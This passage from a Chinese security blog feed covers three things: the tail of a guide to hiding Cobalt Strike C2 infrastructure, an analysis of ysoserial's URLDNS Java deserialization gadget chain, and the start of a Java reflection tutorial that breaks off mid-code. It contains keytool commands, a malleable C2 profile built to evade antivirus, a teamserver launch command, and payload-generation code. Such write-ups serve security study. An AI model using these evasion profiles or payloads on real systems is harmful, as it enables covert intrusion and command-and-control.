自带的cobaltstrike.store，使用以下命令生成一个新的 cobaltstrike.store即可！然后客户端连接即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -<span class="built_in">alias</span> baidu.com -dname <span class="string">&quot;CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)&quot;</span> </span><br><span class="line"></span><br><span class="line">keytool -importkeystore -srckeystore cobaltstrike.store -destkeystore cobaltstrike.store -deststoretype pkcs12</span><br></pre></td></tr></table></figure><p><img src="/2021/03/14/%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8FC2/2246609-20210313210109646-2112467416.png" alt="f3db6a52712b4a8b1577726d6ebc2baa.png"></p><h2 id="0x02-流量加密实现免杀"><a href="#0x02-流量加密实现免杀" class="headerlink" title="0x02 流量加密实现免杀"></a>0x02 流量加密实现免杀</h2><p>cobaltstrike自带了ssl证书，不过该证书已经被杀软标记了，所以的生成自己的免费的证书用以替代cs自带的证书，监听的时候选择https</p><h4 id="1-先利用keytool生成一个免费的证书"><a href="#1-先利用keytool生成一个免费的证书" class="headerlink" title="1. 先利用keytool生成一个免费的证书"></a>1. 先利用keytool生成一个免费的证书</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias tryblog -keyalg RSA -validity 36500 -keystore tryblog.store</span><br></pre></td></tr></table></figure><p>&#96;注： 注意记得-alias后面的参数和-keystore后面的参数后面会用到C2-profile里面；在生成的时候，要记住自己的密码，后面要使用，如果忘记了，就回来重新生成。</p><p>里面的内容随意填写，问你是否正确的时候输入y，然后回车后就成功生成了。证书就在当前目录下<br>&#96;</p><h4 id="2-然后创建一个c2-profile文件，添加以下内容"><a href="#2-然后创建一个c2-profile文件，添加以下内容" class="headerlink" title="2. 然后创建一个c2.profile文件，添加以下内容"></a>2. 然后创建一个c2.profile文件，添加以下内容</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;tryblog POS Malware&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;5000&quot;</span>; <span class="comment"># use a ~30s delay between callbacks</span></span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;10&quot;</span>;    <span class="comment"># throw in a 10% jitter</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#设置证书，注意以下内容得和你之前生成的证书一样</span></span><br><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;TRY&quot;</span>; </span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;TRY&quot;</span>;   </span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;TRY&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;TRY&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;TRY&quot;</span>;  </span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;TRY&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#设置，修改成你的证书名称和证书密码</span></span><br><span class="line">code-signer&#123;</span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;tryblog.store&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;tryblog&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> <span class="built_in">alias</span> <span class="string">&quot;tryblog&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#指定DNS beacon不用的时候指定到IP地址</span></span><br><span class="line"><span class="built_in">set</span> dns_idle <span class="string">&quot;8.8.4.4&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#每个单独DNS请求前强制睡眠时间</span></span><br><span class="line"><span class="built_in">set</span> dns_sleep <span class="string">&quot;0&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#通过DNS上载数据时主机名的最大长度[0-255]</span></span><br><span class="line"><span class="built_in">set</span> maxdns    <span class="string">&quot;235&quot;</span>;</span><br><span class="line"> </span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php /windowsxp/updcheck.php /hello/flash.php&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;textain&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-us&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;textain&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/x-www-form-urltrytryd&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">id</span> &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            parameter <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            prepend <span class="string">&quot;&amp;op=1&amp;id=vxeykS&amp;ui=Josh @ PC&amp;wv=11&amp;gr=backoff&amp;bv=1.55&amp;data=&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http-get &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/updates&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    client &#123;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            prepend <span class="string">&quot;user=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;textain&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">base64</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-验证证书，进入cs文件夹，将刚生成的证书和创建的c2-profile文件复制进去"><a href="#3-验证证书，进入cs文件夹，将刚生成的证书和创建的c2-profile文件复制进去" class="headerlink" title="3. 验证证书，进入cs文件夹，将刚生成的证书和创建的c2.profile文件复制进去"></a>3. 验证证书，进入cs文件夹，将刚生成的证书和创建的c2.profile文件复制进去</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint C2.profile <span class="comment">#命令后面跟你自己的c2文件</span></span><br></pre></td></tr></table></figure><h4 id="4-使用证书启动teamserver"><a href="#4-使用证书启动teamserver" class="headerlink" title="4. 使用证书启动teamserver"></a>4. 使用证书启动teamserver</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./teamserver 1.1.2.3 123456 ./C2.profile &amp; <span class="comment">#nohup就是把程序挂在后台运行</span></span><br></pre></td></tr></table></figure><p>CS的流量由malleable C2配置来掌控的，所以我们需要定向去配置这个C2。<br>Malleable C2 是一种特定领域的语言，主要用来控制“Cobalt Strike Beacon”攻击载荷中的网络指针<br>malleable C2详细知识参考：<br><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/">https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/</a></p><p>在这里可以把流量伪造成高信誉的网站，如Google、baidu等<br>如果不想自己生成的，可以使用如下github中的profile：<br><a href="https://github.com/rsmudge/Malleable-C2-Profiles.git">https://github.com/rsmudge/Malleable-C2-Profiles.git</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-去除特征&quot;&gt;&lt;a href=&quot;#0x01-去除特征&quot; class=&quot;headerlink&quot; title=&quot;0x01 去除特征&quot;&gt;&lt;/a&gt;0x01 去除特征&lt;/h2&gt;&lt;h3 id=&quot;1-更改默认端口&quot;&gt;&lt;a href=&quot;#1-更改默认端口&quot; class=&quot;</summary>
      
    
    
    
    
    <category term="C2" scheme="https://theth1nk3r.github.io/tags/C2/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化漏洞之URLDNS</title>
    <link href="https://theth1nk3r.github.io/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/"/>
    <id>https://theth1nk3r.github.io/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/</id>
    <published>2021-03-09T04:04:00.000Z</published>
    <updated>2022-12-18T12:26:33.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是序列化和反序列化"><a href="#0x00-什么是序列化和反序列化" class="headerlink" title="0x00 什么是序列化和反序列化"></a>0x00 什么是序列化和反序列化</h2><blockquote><p>序列化就是将对象转换为字节序列的过程， 反序列化就是把字节序列恢复为对象的过程。<br>将对象序列化以后可以在一定程度上保证对象的完整性和可传递性，便于在网络上传输或者保存在本地文件中。序列化机制使得对象可以脱离程序的运行而独立存在。</p></blockquote><h4 id="为什么要使用序列化和反序列化-？"><a href="#为什么要使用序列化和反序列化-？" class="headerlink" title="为什么要使用序列化和反序列化 ？"></a>为什么要使用序列化和反序列化 ？</h4><ol><li>对象序列化可以实现分布式对象</li><li>java对象序列化不仅保留一个对象的数据，还会递归保存对象引用的每个对象的数据</li><li>序列化可以将内存中的类写入文件或数据库中</li><li>对象、文件、数据拥有多种不同的文件格式，很难统一传输和保存</li></ol><h2 id="0x01-ysoserial"><a href="#0x01-ysoserial" class="headerlink" title="0x01 ysoserial"></a>0x01 ysoserial</h2><p>在提到反序列化漏洞利用链前，我们就跳不过一个里程碑式的工具。<a href="https://github.com/frohoff/ysoserial">ysoserial</a>，它是2015年由Gabriel Lawrence (@gebl)和ChrisFrohoff (@frohoff)这两位大神在AppSecCali上放出的一个工具，它可以让⽤户根据⾃⼰选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令</p><p><strong>什么是利用链？</strong></p><p>利用链也叫“gadget chains”，通常称为gadget，可以理解为一种方法，从漏洞触发位置开始到执行命令的位置结束，一种生成poc的方法。</p><h2 id="0x02-URLDNS"><a href="#0x02-URLDNS" class="headerlink" title="0x02 URLDNS"></a>0x02 URLDNS</h2><p>URLDNS是ysoserial中一个利用链的名字，准确的来说，它并不能称之为一个利用链；因为它的参数不是一个可以利用的命令，而仅为一个URL，其触发的结果也不是命令执行，而是一次DNS请求</p><p>虽然这个<code>利用链</code>实际上是不可<code>利用</code>的，但因为其有如下的优点，非常适合我们在检测反序列化漏洞时使用：</p><ul><li>使用java内置的类构造，对第三方库没有依赖</li><li>在目标没有回显的时候，能通过DNS请求得知是否存在反序列化漏洞</li></ul><p>ysoserial中的URLDNS代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-URLDNS利用链分析"><a href="#0x03-URLDNS利用链分析" class="headerlink" title="0x03 URLDNS利用链分析"></a>0x03 URLDNS利用链分析</h2><h4 id="3-1-配置IDEA环境"><a href="#3-1-配置IDEA环境" class="headerlink" title="3.1 配置IDEA环境"></a>3.1 配置IDEA环境</h4><p>去github上将yso源码下载下来，<a href="https://github.com/frohoff/ysoserial">ysoserial</a>。然后用IDEA打开，因为他是maven打包的项目，在打开后IDEA会自动根据配置下载依赖。</p><p>然后我们找到URLDNS类，并配置Debug Configurations<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171130611-612042412.png" alt="65c838a1da408aa9940fb0c60fbdf119.png"></p><p>修改Program arguments，加上运行时的命令行参数即可（ <a href="http://xxx.xxx.com)/">http://xxx.xxx.com）</a><br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171129079-546119439.png" alt="0cce795f5ef090d273d3bb89ab918a69.png"></p><h4 id="3-2-开始调试"><a href="#3-2-开始调试" class="headerlink" title="3.2 开始调试"></a>3.2 开始调试</h4><p>因为触发反序列化的⽅法是 <code>readObject</code> ，又因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，所以导致可以构造利⽤链。</p><p>我们直接看<code>HashMap</code>中的<code>readObject</code>方法，发现他在如下图中位置将<code>HashMap</code>的键名计算了hash<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309170927253-446090948.png" alt="https://img2020.cnblogs.com/blog/2246609/202103/2246609-20210309170927253-446090948.png"></p><p>在这个位置下个断点，对这个hash函数进行调试并跟进，这是调用栈：<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171128776-927450762.png" alt="f80468bebfec743d13041977b572db56.png"></p><p><code>hash</code>方法调用了key的<code>hashCode()</code>方法：<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171128152-704876817.png" alt="a1caebfc2f5446329be1ac8c4cfd9c2c.png"></p><p>然后再看看<code>hashCode</code>方法：<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171127489-1422878119.png" alt="913bd121ad748a1829709c9f6b637330.png"></p><p>此时，<code>handler</code>是<code>URLStreamhandler</code>对象，在继续跟进<code>hashCode</code>方法<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171126673-164973691.png" alt="d782ecda1d265f94f4447fac3ca43eb4.png"></p><p>这⾥有调⽤<code>getHostAddress</code>⽅法，继续跟进：<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171125197-1913696144.png" alt="81115b8d245412970c4b638a04609f0a.png"></p><p>这⾥<code> InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。到这⾥就不必要再跟了。 我们⽤⼀些第三⽅的反连平台就可以查看到这次请求，证明的确存在反序列化漏洞：<br><img src="/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS/2246609-20210309171123790-909108767.png" alt="170ab84b52cacbb5e05c31fddb6df923.png"></p><p>到这里，整个<code>URLDNS</code>的Gadget就出来了</p><ol><li>HashMap-&gt;readObject() </li><li>HashMap-&gt;hash() </li><li>URL-&gt;hashCode() </li><li>URLStreamHandler-&gt;hashCode() </li><li>URLStreamHandler-&gt;getHostAddress() </li><li>InetAddress-&gt;getByName()</li></ol><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><p><a href="https://t.zsxq.com/ieMZBQj">Java安全漫谈</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-什么是序列化和反序列化&quot;&gt;&lt;a href=&quot;#0x00-什么是序列化和反序列化&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是序列化和反序列化&quot;&gt;&lt;/a&gt;0x00 什么是序列化和反序列化&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;序</summary>
      
    
    
    
    
    <category term="JAVA反序列化" scheme="https://theth1nk3r.github.io/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化漏洞（1）之反射机制</title>
    <link href="https://theth1nk3r.github.io/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>https://theth1nk3r.github.io/2021/03/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</id>
    <published>2021-03-09T01:49:00.000Z</published>
    <updated>2022-12-18T12:26:24.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><h2 id="0x00-java反射简介"><a href="#0x00-java反射简介" class="headerlink" title="0x00 java反射简介"></a>0x00 java反射简介</h2><blockquote><p>反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性，这种动态获取的信息以及动态调用对象的方法的功能称为<strong>java语言的反射机制</strong></p><blockquote><p>将类的各个部分封装为其他对象<br>反射是框架设计的灵魂<br><strong>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值</strong></p></blockquote></blockquote><p>Java 反射主要提供以下功能：</p><ul><li>在运行时判断任意一个对象所属的类；</li><li>在运行时构造任意一个类的对象；</li><li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li><li>在运行时调用任意一个对象的方法</li></ul><p>反射的好处：</p><ol><li>可以在程序运行过程中，操作这些对象</li><li>可以解耦，提高程序的可扩展性</li></ol><h2 id="0x01-获取class对象"><a href="#0x01-获取class对象" class="headerlink" title="0x01 获取class对象"></a>0x01 获取class对象</h2><p>java反射操作的是<code>java.lang.Class</code>对象，有一下方法获取一个类的Class对象：</p><ol><li><code>类名.class</code></li><li><code>Class.forName(&quot;com.demo.classloader.TestClass&quot;)</code> </li><li><code>ClassLoader.loadClass(&quot;com.demo.classLoader.TestClass&quot;)</code></li></ol><p>反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>，如<code>com.org.test</code>类有一个叫做<code>Hello</code>的内部类，则在调用它的时候要写成：<code>com.org.test$Hello</code>。</p><h2 id="0x02-反射java-lang-Runtime"><a href="#0x02-反射java-lang-Runtime" class="headerlink" title="0x02 反射java.lang.Runtime"></a>0x02 反射java.lang.Runtime</h2><p><code>java.lang.Runtime</code>中有一个<code>exec</code>方法可以执行本地命令，在很多<strong>payload</strong>中都能看见反射<strong>Runtime</strong>类来执行本地命令</p><p><strong>不使用反射执行本地命令代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line">System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure><p><strong>反射Runtime执行本地命令代码片段：</strong></p><blockquote><p>这里的<code>IOUtils</code>是<code>org.apache.commons.io.IOUtils</code>包下的，需要使用maven导入</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> 